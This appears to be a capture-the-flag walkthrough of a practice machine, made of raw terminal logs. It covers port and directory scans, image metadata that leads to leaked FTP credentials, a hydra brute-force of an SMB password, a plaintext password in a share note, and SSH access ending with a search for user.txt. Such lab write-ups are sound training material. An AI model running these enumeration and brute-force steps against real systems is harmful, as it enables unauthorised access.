```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.84.115
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-01 12:47 UTC
Nmap scan report for ip-10-10-84-115.eu-west-1.compute.internal (10.10.84.115)
Host is up (0.0014s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Infinite Loop - Bootstrap 4.0 HTML Template
81/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9d:d5:13:8b:01:1d:67:9c:01:44:b7:06:47:54:f6:9c (RSA)
|   256 53:29:7f:91:12:2e:db:6e:b8:f5:3f:d4:05:8e:7f:11 (ECDSA)
|_  256 d0:e8:2e:ab:7e:6b:88:9b:ec:90:b0:36:cc:94:0f:35 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2121/tcp open  ftp         vsftpd 2.0.8 or later
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http        Apache Tomcat 8.5.45
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/8.5.45
MAC Address: 02:AE:3C:C1:C6:0C (Unknown)
Service Info: Host: TRYHACKME; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: -1s
|_nbstat: NetBIOS name: TRYHACKME, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: tryhackme
|   NetBIOS computer name: TRYHACKME\x00
|   Domain name: \x00
|   FQDN: tryhackme
|_  System time: 2020-08-01T15:48:25+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-01T12:48:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.58 seconds
```



- gobuster
```
root@kali:~# gobuster dir -u http://10.10.84.115 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.84.115
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html,zip
[+] Timeout:        10s
===============================================================
2020/08/01 12:51:24 Starting gobuster
===============================================================
/index.html (Status: 200)
/img (Status: 301)
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/slick (Status: 301)
/server-status (Status: 403)
```

afeter access admin

```
root@kali:~# wget http://10.10.84.115/img/testimonial.jpeg
--2020-08-01 12:57:35--  http://10.10.84.115/img/testimonial.jpeg
Connecting to 10.10.84.115:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22275 (22K) [image/jpeg]
Saving to: ‘testimonial.jpeg’

testimonial.jpeg              100%[==============================================>]  21.75K  --.-KB/s    in 0s

2020-08-01 12:57:35 (76.9 MB/s) - ‘testimonial.jpeg’ saved [22275/22275]

```

```
root@kali:~# exiftool
Syntax:  exiftool [OPTIONS] FILE

Consult the exiftool documentation for a full list of options.
root@kali:~# exiftool testimonial.jpeg
ExifTool Version Number         : 12.01
File Name                       : testimonial.jpeg
Directory                       : .
File Size                       : 22 kB
File Modification Date/Time     : 2019:08:28 09:01:24+00:00
File Access Date/Time           : 2020:08:01 13:00:16+00:00
File Inode Change Date/Time     : 2020:08:01 12:57:35+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 11.61
Author                          : The one that pwned you
Comment                         : @SammyTHM
Image Width                     : 275
Image Height                    : 183
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 275x183
```


- twitter
- 
```
It's incredible how you cannot even secure a connection, but you think u're awesome...
Here "batman", showing you how incapable you are
 
https://anonfile.com/Wc90nb44n5/captured_pcapng
```

```
220 Welcome to Sammy's FTP service.
USER sammy
331 Please specify the password.
PASS samuel123456
230 Login successful.
SYST
215 UNIX Type: L8

```

```
root@kali:~# ftp 10.10.84.115 2121
Connected to 10.10.84.115.
220 Welcome to Sammy's FTP service.
Name (10.10.84.115:root): sammy
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Aug 27  2019 .
dr-xr-xr-x    3 65534    65534        4096 Aug 27  2019 ..
drwxr-xr-x    2 1001     1001         4096 Aug 28  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Aug 28  2019 .
dr-xr-xr-x    3 65534    65534        4096 Aug 27  2019 ..
-rw-r--r--    1 1001     1001          174 Aug 28  2019 help.txt
226 Directory send OK.
ftp> mget help.txt
```

```
root@kali:~# cat help.txt
Hey Kevin... i've been so busy with other things and i forgot my SMB pass.
Please reach out to me if you find it/reset it. I just know that's a basic password.

Thanks, Zach

```

```
root@kali:~# hydra -l zach -P /usr/share/wordlists/rockyou.txt 10.10.84.115 smb
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-01 13:18:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://10.10.84.115:445/
[445][smb] host: 10.10.84.115   login: zach   password: secret
1 of 1 target successfully completed, 1 valid password found

```


- smb windows 
- \\10.10.84.115
```
Knock knock knock?
Who's there?
21 2000 8888, would ya let me in?
Nope! You are not allowed to knock,

Thanks for resetting my pass, but unforgettablelongpassword123 is long, and even though seems simple to remember i had to note it down.

- Kevin -

```

```
root@kali:~/smbmap# ssh kevin@10.10.84.115 -p 81
The authenticity of host '[10.10.84.115]:81 ([10.10.84.115]:81)' can't be established.
ECDSA key fingerprint is SHA256:V4Ntdl//PlyDHQ3jPDEDrbADBQ6d8CBAxUF70WPr9QE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.84.115]:81' (ECDSA) to the list of known hosts.
kevin@10.10.84.115's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

kevin@TryHackMe:~$ ls -al
total 84
drwxr-x--- 17 kevin kevin 4096 aug 29  2019 .
drwxr-xr-x  5 root  root  4096 aug 28  2019 ..
drwx------ 11 kevin kevin 4096 aug  1 16:49 .cache
drwx------ 14 kevin kevin 4096 aug 28  2019 .config
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Desktop
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Documents
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Downloads
drwx------  2 kevin kevin 4096 aug 28  2019 .gconf
drwx------  3 kevin kevin 4096 aug 29  2019 .gnupg
-rw-------  1 kevin kevin 3630 aug 29  2019 .ICEauthority
drwx------  3 kevin kevin 4096 aug 28  2019 .local
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Music
drwxrwxr-x  2 kevin kevin 4096 aug 28  2019 .nano
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Pictures
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Public
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Templates
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 Videos
drwxr-xr-x  4 kevin kevin 4096 aug 28  2019 .work
-rw-------  1 kevin kevin   54 aug 29  2019 .Xauthority
-rw-------  1 kevin kevin   82 aug 29  2019 .xsession-errors
-rw-------  1 kevin kevin 1243 aug 28  2019 .xsession-errors.old
kevin@TryHackMe:~$ cd Desktop/
kevin@TryHackMe:~/Desktop$ ls
kevin@TryHackMe:~/Desktop$ ls -al
total 8
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 .
drwxr-x--- 17 kevin kevin 4096 aug 29  2019 ..
kevin@TryHackMe:~/Desktop$ cd ../
kevin@TryHackMe:~$ cd Documents/
kevin@TryHackMe:~/Documents$ ls
kevin@TryHackMe:~/Documents$ cd ../Downloads/
kevin@TryHackMe:~/Downloads$ ls
kevin@TryHackMe:~/Downloads$ ls -al
total 8
drwxr-xr-x  2 kevin kevin 4096 aug 28  2019 .
drwxr-x--- 17 kevin kevin 4096 aug 29  2019 ..
kevin@TryHackMe:~/Downloads$ pwd
/home/kevin/Downloads
kevin@TryHackMe:~/Downloads$ find / -name "user.txt" -type f 2>/dev/null
/home/kevin/.work/user.txt
kevin@TryHackMe:~/Downloads$ cat /home/kevin/.work/user.txt

```
